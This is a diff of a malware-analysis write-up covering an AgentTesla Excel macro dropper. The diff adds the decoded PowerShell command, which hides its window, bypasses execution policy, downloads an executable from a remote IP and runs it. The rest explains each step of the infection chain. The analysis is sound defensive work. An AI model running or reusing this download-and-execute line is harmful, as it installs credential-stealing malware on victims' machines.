@@ -103,6 +103,10 @@ Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
 
 ![[Pasted image 20260221011812.png]]
 
+```
+"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } �PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
+```
+
 **C. The Final Payload Explained**  
 The cleaned script reveals a classic malware downloader pattern:
 
@@ -113,26 +117,26 @@ The cleaned script reveals a classic malware downloader pattern:
 - `-executionpolicy bypass`: Overrides Windows' default security policy to allow any script to run.
 
 2.**Download:**
-    
-    - `Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile`
-        
-    - Downloads a file from the remote server. Note the file is named with a `.pdf` extension to appear harmless, but is saved as an `.exe`.
-        
-3. **Execution:**
-    
-    - `Start-Process $TempFile`
-        
-    - Runs the downloaded executable, completing the infection chain.
-        
+
+- `Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile`
+
+- Downloads a file from the remote server. Note the file is named with a `.pdf` extension to appear harmless, but is saved as an `.exe`.
+
+3.**Execution:**
+
+- `Start-Process $TempFile`
+
+- Runs the downloaded executable, completing the infection chain.
+
 
 #### 4. Summary of the Attack Chain
 
-1. **User Action:** Victim opens the `agenttesla.xlsm` file.
-    
-2. **Auto-execution:** The embedded Macro runs automatically.
-    
-3. **Payload Staging:** The VBA script builds and executes a hidden, bypassed PowerShell command.
-    
-4. **Malware Drop:** PowerShell downloads `Doc-3737122pdf.exe` from a remote C2 server.
-    
-5. **Infection:** PowerShell executes the downloaded malware (AgentTesla).
+1.**User Action:** Victim opens the `agenttesla.xlsm` file.
+
+2.**Auto-execution:** The embedded Macro runs automatically.
+
+3.**Payload Staging:** The VBA script builds and executes a hidden, bypassed PowerShell command.
+
+4.**Malware Drop:** PowerShell downloads `Doc-3737122pdf.exe` from a remote C2 server.
+
+5.**Infection:** PowerShell executes the downloaded malware (AgentTesla).
